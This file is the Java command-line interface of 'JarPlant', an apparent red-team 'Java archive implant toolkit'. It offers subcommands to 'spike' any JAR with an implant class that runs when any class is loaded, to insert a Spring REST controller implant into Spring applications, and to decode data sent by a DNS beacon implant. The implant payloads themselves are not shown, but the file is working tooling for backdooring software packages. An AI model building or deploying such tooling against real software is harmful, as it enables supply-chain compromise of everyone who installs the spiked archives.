package org.example;

import net.sourceforge.argparse4j.ArgumentParsers;
import net.sourceforge.argparse4j.impl.Arguments;
import net.sourceforge.argparse4j.inf.*;
import org.example.implants.*;
import org.example.implants.utils.DnsBeaconDecoder;
import org.example.injector.*;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.*;
import java.util.logging.Formatter;
import java.util.logging.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static net.sourceforge.argparse4j.impl.Arguments.storeTrue;

public class Cli {
    private final static Logger log = Logger.getLogger("JarPlant");

    // Credz: 'Square' font by Chris Gill, 30-JUN-94 -- based on .sig of Jeb Hagan.
    private final static String banner =
            "       _____               ______  __                __   \n" +
                    "     _|     |.---.-..----.|   __ \\|  |.---.-..-----.|  |_ \n" +
                    "    |       ||  _  ||   _||    __/|  ||  _  ||     ||   _|\n" +
                    "    |_______||___._||__|  |___|   |__||___._||__|__||____|\n" +
                    "    Java archive implant toolkit   v0.1   by w1th4d & kugg";

    private final static String examples = "for more options, see command help pages:\n" +
            "  $ java -jar jarplant.jar class-injector -h\n" +
            "  $ java -jar jarplant.jar spring-injector -h\n" +
            "    ...\n\n" +
            "example usage:\n" +
            "  $ java -jar jarplant.jar class-injector \\\n" +
            "    --target path/to/target.jar --output spiked-target.jar";

    enum Command {
        CLASS_INJECTOR, SPRING_INJECTOR, IMPLANT_LIST, IMPLANT_INFO, DECODER
    }

    public static void main(String[] args) {
        ArgumentParser parser = ArgumentParsers.newFor("java -jar jarplant.jar").build()
                .defaultHelp(true)
                .description(banner)
                .epilog(examples);
        Subparsers subparsers = parser.addSubparsers()
                .metavar("command");

        Subparser classInjectorParser = subparsers.addParser("class-injector")
                .help("Inject a class implant into any JAR. The implant will detonate whenever any class in the JAR is used but the payload will only run once (or possibly twice in some very fringe cases). This is the most versatile implant type and works with any JAR (even ones without a main function, like a library).")
                .description(banner)
                .setDefault("command", Command.CLASS_INJECTOR);
        classInjectorParser.addArgument("--brief")
                .help("Print less details on what's going on.")
                .type(Boolean.class)
                .action(storeTrue())
                .setDefault(false);
        classInjectorParser.addArgument("--debug")
                .help("Print a lot more details on what's going on.")
                .type(Boolean.class)
                .action(storeTrue())
                .setDefault(false);
        classInjectorParser.addArgument("-t", "--target")
                .help("Path to the JAR file to spike.")
                .metavar("JAR")
                .type(Arguments.fileType().acceptSystemIn().verifyExists().verifyCanRead())
                .required(true);
        classInjectorParser.addArgument("-o", "--output")
                .help("Path to where the spiked JAR will be written. The default behaviour is to overwrite the target JAR. This option overrides that behaviour.")
                .metavar("JAR")
                .type(Arguments.fileType().verifyCanCreate())
                .required(false);
        classInjectorParser.addArgument("-i", "--implant-class")
                .help("Name of the class containing a custom 'init()' method and other implant logic.")
                .choices("ClassImplant", "DnsBeaconImplant")
                .setDefault("ClassImplant");
        classInjectorParser.addArgument("-c", "--config")
                .help("Override one or more configuration properties inside the implant.")
                .metavar("KEY=VALUE")
                .nargs("*")
                .type(String.class);

        Subparser springInjectorParser = subparsers.addParser("spring-injector")
                .help("Inject a Spring component implant into JAR-packaged Spring application. The component will be loaded and included in the Spring context. The component could be something like an extra REST controller or scheduled task.")
                .description(banner)
                .setDefault("command", Command.SPRING_INJECTOR);
        springInjectorParser.addArgument("--brief")
                .help("Print less details on what's going on.")
                .type(Boolean.class)
                .action(storeTrue())
                .setDefault(false);
        springInjectorParser.addArgument("--debug")
                .help("Print a lot more details on what's going on.")
                .type(Boolean.class)
                .action(storeTrue())
                .setDefault(false);
        springInjectorParser.addArgument("-t", "--target")
                .help("Path to the JAR file to spike.")
                .metavar("JAR")
                .type(Arguments.fileType().acceptSystemIn().verifyExists().verifyCanRead())
                .required(true);
        springInjectorParser.addArgument("-o", "--output")
                .help("Path to where the spiked JAR will be written. The default behaviour is to overwrite the target JAR. This option overrides that behaviour.")
                .metavar("JAR")
                .type(Arguments.fileType().verifyCanCreate())
                .required(false);
        springInjectorParser.addArgument("--implant-component")
                .help("Name of the Spring component to inject into the class. This will typically be a '@RestController' class.")
                .choices("SpringImplantController")
                .setDefault("SpringImplantController");
        springInjectorParser.addArgument("--implant-config")
                .help("Name of the Spring configuration class to use as a template in case the target Spring config needs to be modified. Only the '@Bean' annotated methods in this class will be copied to the target config.")
                .choices("SpringImplantConfiguration")
                .setDefault("SpringImplantConfiguration");

        Subparser implantListParser = subparsers.addParser("implant-list")
                .help("List all bundled implants.")
                .description(banner)
                .setDefault("command", Command.IMPLANT_LIST);

        Subparser implantInfoParser = subparsers.addParser("implant-info")
                .help("See more details about a specific implant. This includes reading its class to see all available configuration properties and their data types. A class file path can be specified to read a custom implant.")
                .description(banner)
                .setDefault("command", Command.IMPLANT_INFO);
        implantInfoParser.addArgument("implant")
                .help("Implant to list details about. Can be a name of a bundled implant or a path to a class file (or a mix of both).")
                .metavar("IMPLANT")
                .type(String.class)
                .nargs("*")
                .required(false);

        Subparser decoderParser = subparsers.addParser("decoder")
                .help("Utility to decode stuff generated by some of the built-in payloads.")
                .description(banner)
                .setDefault("command", Command.DECODER);
        decoderParser.addArgument("-v", "--verbose")
                .help("Print more details on what's going on.")
                .type(Boolean.class)
                .action(storeTrue())
                .setDefault(false);
        decoderParser.addArgument("-i", "--input-file")
                .help("Path to the JAR file to spike.")
                .metavar("FILE")
                .type(Arguments.fileType().acceptSystemIn().verifyExists().verifyCanRead())
                .required(false);
        decoderParser.addArgument("input")
                .help("Raw input data.")
                .metavar("INPUT")
                .type(String.class)
                .nargs("*")
                .required(false);

        Namespace namespace;
        try {
            namespace = parser.parseArgs(args);
        } catch (ArgumentParserException e) {
            parser.handleError(e);
            System.exit(1);
            throw new RuntimeException("Unreachable");
        }

        // Set log level based on verbosity flags
        Boolean briefFlag = namespace.getBoolean("brief");
        Boolean debugFlag = namespace.getBoolean("debug");
        if (debugFlag != null && debugFlag) {
            configureLogger(Level.ALL, LogSourceLevel.ALL);
        } else if (briefFlag != null && briefFlag) {
            configureLogger(Level.INFO, LogSourceLevel.CLI);
        } else {
            configureLogger(Level.INFO, LogSourceLevel.LIB);
        }

        Command command = namespace.get("command");
        switch (command) {
            case CLASS_INJECTOR -> classInjector(namespace);
            case SPRING_INJECTOR -> springInjector(namespace);
            case IMPLANT_LIST -> listImplants();
            case IMPLANT_INFO -> printImplantInfo(namespace);
            case DECODER -> decodeStuff(namespace);
            default -> {
                parser.printHelp();
                System.exit(1);
            }
        }
    }

    private static void classInjector(Namespace namespace) {
        Path targetPath = Path.of(namespace.getString("target"));

        Path outputPath = targetPath;   // Default to overwrite target JAR
        if (namespace.getString("output") != null) {
            outputPath = Path.of(namespace.getString("output"));
        }

        String implantClassName = namespace.getString("implant_class");
        ImplantHandler implantHandler;
        if (implantClassName.equals("ClassImplant")) {
            try {
                implantHandler = ImplantHandlerImpl.findAndCreateFor(ClassImplant.class);
            } catch (ClassNotFoundException | IOException e) {
                throw new RuntimeException("Cannot find built-in implant class.", e);
            }
        } else if (implantClassName.equals("DnsBeaconImplant")) {
            try {
                implantHandler = ImplantHandlerImpl.findAndCreateFor(DnsBeaconImplant.class);
            } catch (ClassNotFoundException | IOException e) {
                throw new RuntimeException("Cannot find built-in implant class.", e);
            }
        } else {
            System.err.println("Unknown --implant-class.");
            System.exit(1);
            throw new RuntimeException();
        }

        Map<String, Object> configOverrides = parseConfigOverrides(namespace);
        try {
            implantHandler.setConfig(configOverrides);
        } catch (ImplantConfigException e) {
            System.err.println("Cannot set implant config: " + e.getMessage());
            System.exit(1);
        }

        runClassInjector(targetPath, outputPath, implantHandler);
    }

    public static void runClassInjector(Path targetPath, Path outputPath, ImplantHandler implantHandler) {
        ClassInjector injector = new ClassInjector(implantHandler);

        System.out.println(banner);
        System.out.println();

        log.config("Implant class: " + implantHandler.getImplantClassName());
        log.config("Target JAR: " + targetPath);
        log.config("Output JAR: " + outputPath);

        log.fine("Reading available implant config properties...");
        Map<String, ImplantHandlerImpl.ConfDataType> availableConfig = implantHandler.getAvailableConfig();
        for (Map.Entry<String, ImplantHandlerImpl.ConfDataType> entry : availableConfig.entrySet()) {
            log.fine(entry.getKey() + " (" + entry.getValue() + ")");
        }

        try {
            boolean didInfect = injector.infect(targetPath, outputPath);

            if (didInfect) {
                if (outputPath.equals(targetPath)) {
                    log.info("Successfully spiked JAR '" + targetPath + "'.");
                } else {
                    log.info("Successfully spiked JAR '" + targetPath + "' -> '" + outputPath + "'.");
                }
            } else {
                log.warning("Failed to spike JAR '" + targetPath + "'.");
            }
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    private static void springInjector(Namespace namespace) {
        Path targetPath = Path.of(namespace.getString("target"));

        Path outputPath = targetPath;   // Default to overwrite target JAR
        if (namespace.getString("output") != null) {
            outputPath = Path.of(namespace.getString("output"));
        }

        String implantComponent = namespace.getString("implant_component");
        String implantConfClass = namespace.getString("implant_config");
        if (implantComponent.equals("SpringImplantController") && implantConfClass.equals("SpringImplantConfiguration")) {
            ImplantHandler componentHandler;
            ImplantHandler springConfigHandler;
            try {
                componentHandler = ImplantHandlerImpl.findAndCreateFor(SpringImplantController.class);
                springConfigHandler = ImplantHandlerImpl.findAndCreateFor(SpringImplantConfiguration.class);
            } catch (ClassNotFoundException | IOException e) {
                throw new RuntimeException("Cannot find built-in implant class.", e);
            }

            Map<String, Object> configOverrides = parseConfigOverrides(namespace);
            try {
                componentHandler.setConfig(configOverrides);
            } catch (ImplantConfigException e) {
                System.err.println("Cannot set implant config: " + e.getMessage());
                System.exit(1);
            }

            runSpringInjector(targetPath, outputPath, componentHandler, springConfigHandler);
        } else {
            System.err.println("Unknown --implant-component or --implant-config.");
            System.exit(1);
        }
    }

    public static void runSpringInjector(Path targetPath, Path outputPath, ImplantHandler componentHandler, ImplantHandler springConfigHandler) {
        SpringInjector injector = new SpringInjector(componentHandler, springConfigHandler);

        System.out.println(banner);
        System.out.println();

        log.config("Implant Spring component: " + componentHandler.getImplantClassName());
        log.config("Implant Spring config class: " + componentHandler.getImplantClassName());
        log.config("Target JAR: " + targetPath);
        log.config("Output JAR: " + outputPath);

        try {
            boolean didInfect = injector.infect(targetPath, outputPath);
            if (didInfect) {
                if (outputPath.equals(targetPath)) {
                    log.info("Successfully spiked JAR '" + targetPath + "'.");
                } else {
                    log.info("Successfully spiked JAR '" + targetPath + "'-> '" + outputPath + "'.");
                }
            } else {
                log.warning("Failed to spike JAR '" + targetPath + "'.");
            }
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    private static Map<String, Object> parseConfigOverrides(Namespace namespace) {
        Map<String, Object> config = new HashMap<>();

        ArrayList<String> configArgs = namespace.get("config");
        if (configArgs == null) {
            return Collections.emptyMap();
        }

        Pattern regex = Pattern.compile("^(?<key>\\w+)=(?<value>[\\w\\\\.\\-_ ]+)$");
        for (String configArg : configArgs) {
            Matcher match = regex.matcher(configArg);
            if (!match.matches()) {
                System.err.println("Each config entry must be in the format KEY=VALUE. Example: CONF_LOCAL_PORT=1234");
                System.exit(1);
            }
            String key = match.group("key");
            String value = match.group("value");
            if (key == null && value == null) {
                throw new RuntimeException("Internal error: Regex groups does not exist despite a match.");
            }

            config.put(key, value);
        }

        return config;
    }

    private static void listImplants() {
        System.out.println(banner);
        System.out.println();

        System.out.println("Bundled implants:");
        for (ImplantInfo info : ImplantInfo.values()) {
            System.out.println(" - " + info.name() + ":");
            System.out.println("      " + info.summary);
        }
    }

    private static void printImplantInfo(Namespace namespace) {
        System.out.println(banner);
        System.out.println();

        List<String> implants = namespace.getList("implant");
        for (String implant : implants) {
            ImplantHandler implantHandler;
            try {
                ImplantInfo bundled = ImplantInfo.valueOf(implant);
                implantHandler = ImplantHandlerImpl.findAndCreateFor(bundled.clazz);
                System.out.println("Bundled implant '" + implant + "':");
            } catch (ClassNotFoundException | IOException e) {
                throw new RuntimeException("Failed to read bundled implant: " + e.getMessage());
            } catch (IllegalArgumentException e) {
                // This is Javas way of saying that no enum value was found
                // Try interpreting this as a file instead
                try {
                    Path classFilePath = Path.of(implant);
                    if (!Files.exists(classFilePath)) {
                        System.out.println("Implant not found: " + implant);
                        continue;
                    }
                    implantHandler = ImplantHandlerImpl.createFor(classFilePath);
                    System.out.println("File '" + implant + "':");
                } catch (IOException e2) {
                    System.out.println("Failed to read class file: " + e2.getMessage());
                    continue;
                }
            }

            System.out.println("   Class: " + implantHandler.getImplantClassName());
            System.out.println("   Available configuration properties:");
            for (Map.Entry<String, ImplantHandlerImpl.ConfDataType> entry : implantHandler.getAvailableConfig().entrySet()) {
                System.out.println("    - " + entry.getKey() + " (" + entry.getValue() + ")");
            }
        }
    }

    private static void decodeStuff(Namespace namespace) {
        boolean verbose = namespace.getBoolean("verbose");

        List<String> inputs = new ArrayList<>();

        // Add all inputs from file
        String inputFile = namespace.getString("input_file");
        if (inputFile != null) {
            if (inputFile.equals("-")) {
                // Read from stdin instead
                Scanner stdin = new Scanner(System.in);
                while (stdin.hasNextLine()) {
                    String stdinInput = stdin.nextLine();
                    inputs.add(stdinInput);
                }
            } else {
                // Add inputs from a regular text file
                try {
                    inputs.addAll(Files.readAllLines(Path.of(inputFile)));
                    if (verbose) {
                        System.err.println("Using input file: " + inputFile);
                    }
                } catch (IOException e) {
                    System.err.println("Failed to read input file: " + inputFile);
                }
            }
        }

        // Add any inputs specified on the command-line
        ArrayList<String> cliInputs = namespace.get("input");
        if (cliInputs != null) {
            inputs.addAll(cliInputs);
        }

        for (String input : inputs) {
            Optional<Map<String, String>> decoded = DnsBeaconDecoder.decode(input);
            if (decoded.isEmpty()) {
                System.err.println("Could not parse: " + input);
            } else {
                String json = DnsBeaconDecoder.toJson(decoded.get());
                System.out.println(json);
            }
        }
    }

    /**
     * Configure JUL (java.util.logger) to write nicely to stdout.
     */
    private static void configureLogger(Level logLevel, LogSourceLevel sources) {
        Logger rootLogger = Logger.getLogger("");
        rootLogger.setLevel(logLevel);
        for (Handler handler : rootLogger.getHandlers()) {
            rootLogger.removeHandler(handler);
        }
        StreamHandler handler = new StreamHandler(System.out, new Formatter() {
            @Override
            public String format(LogRecord logRecord) {
                StringBuilder line = new StringBuilder();
                Level logLevel = logRecord.getLevel();
                if (logLevel.equals(Level.SEVERE)) {
                    line.append("[!] ");
                } else if (logLevel.equals(Level.WARNING)) {
                    line.append("[-] ");
                } else if (logLevel.equals(Level.INFO)) {
                    line.append("[+] ");
                } else if (logLevel.equals(Level.CONFIG)) {
                    line.append("[*] ");
                } else {
                    line.append("[ ] ");
                }
                line.append(logRecord.getMessage()).append("\n");

                return line.toString();
            }
        });
        handler.setLevel(logLevel);
        handler.setFilter(logRecord -> {
            String sourceClassName = logRecord.getSourceClassName();
            if (sourceClassName == null) {
                // Unknown source class. Just default to OK.
                return true;
            }
            if (sources.equals(LogSourceLevel.CLI)) {
                return sourceClassName.equals(Cli.class.getName());
            }
            if (sources.equals(LogSourceLevel.LIB)) {
                return sourceClassName.startsWith("org.example.");
            }
            return sources.equals(LogSourceLevel.ALL);
        });
        rootLogger.addHandler(handler);
    }

    private enum LogSourceLevel {
        CLI, LIB, ALL
    }
}
